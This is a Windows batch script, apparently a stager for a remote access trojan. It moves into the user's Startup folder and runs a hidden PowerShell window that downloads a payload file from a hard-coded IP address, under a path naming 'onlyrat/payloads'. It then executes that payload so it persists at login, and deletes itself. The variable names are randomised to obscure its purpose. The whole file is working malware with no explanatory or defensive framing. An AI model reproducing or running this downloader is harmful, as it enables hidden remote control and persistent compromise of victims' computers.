@echo off
set "dEyOmyQt=195.35.32.34"
set "ytEpLvB=%cd%"
set "QaTtaLL=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cd %QaTtaLL%
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri http://%dEyOmyQt%/mk01-onlyrat/payloads/v1.cmd -OutFile bRaP1.cmd"
powershell ./bRaP1.cmd
cd "%ytEpLvB%"
del from-vps.cmd